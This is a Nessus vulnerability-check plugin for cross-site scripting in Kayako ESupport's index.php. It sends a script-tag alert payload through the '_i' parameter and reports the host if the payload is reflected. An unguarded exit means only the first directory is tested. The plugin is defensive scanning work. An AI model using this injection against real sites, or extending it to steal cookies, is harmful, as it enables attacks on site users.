#
# (C) Tenable Network Security
#
# 


if (description) {
  script_id(17598);
  script_version("$Revision: 1.1 $");
  script_bugtraq_id(12868);

  name["english"] = "Kayako ESupport Index.PHP Multiple Parameter Cross-Site Scripting Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The version of Kayako ESupport installed on the remote host is subject
to multiple cross-site scripting vulnerabilities in the script
'index.php' through the parameters 'questiondetails&_i',
'questionprint&_i', 'troubleshooter&_c', and 'subcat&_i'.  These
issues may allow an attacker to cause code to run on a user's browser
within the context of the remote site, enabling him to steal
authentication cookies, access data recently submitted by the user,
and the like. 

See also : http://www.securityfocus.com/archive/1/393946

Solution : Upgrade to a version of ESupport greater than 2.3.1
when it becomes available.

Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple parameter cross-site scripting vulnerabilities in Kayako ESupport's index.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("find_service.nes", "http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if ( get_kb_item("www/" + port + "/generic_xss") ) exit(0);


# Try the exploit.
foreach dir (cgi_dirs()) {
  # A simple alert to display "Nessus was here".
  xss = "'><script>alert('Nessus was here');</script>";
  # nb: the url-encoded version is what we need to pass in.
  exss = "'%3E%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
  req = http_get(
    item:string(
      dir, 
      "/index.php?",
      "_a=knowledgebase&",
      "_j=questiondetails&",
      "_i=[1][", exss, "]"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
  if (res == NULL) exit(0);

  # If we see our XSS, there's a problem.
  if (xss >< res )
    security_warning(port:port);
    exit(0);
 }
